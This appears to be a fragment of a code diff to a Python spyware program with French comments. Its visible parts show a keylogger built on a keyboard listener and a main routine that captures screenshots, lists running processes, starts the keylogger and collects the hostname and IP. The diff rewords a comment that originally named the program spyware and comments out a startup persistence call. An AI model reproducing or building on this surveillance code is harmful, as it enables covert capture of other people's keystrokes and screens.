@@ -78,7 +78,7 @@ def Keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-    # Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
+    # Ici, retirez les 4 # devant les commandes pour faire en sorte que le bordel s'arrête quand on appuie sur Echap.
     #def on_press(key):
     #    logging.info(str(key))
     #    if key == Key.esc:
@@ -100,7 +100,7 @@ def Main():
     screenshot()
     tasklist()
     Keylogger()
-    startup()
+    #startup()
 
     # Prend l'ip
     hostname = socket.gethostname()
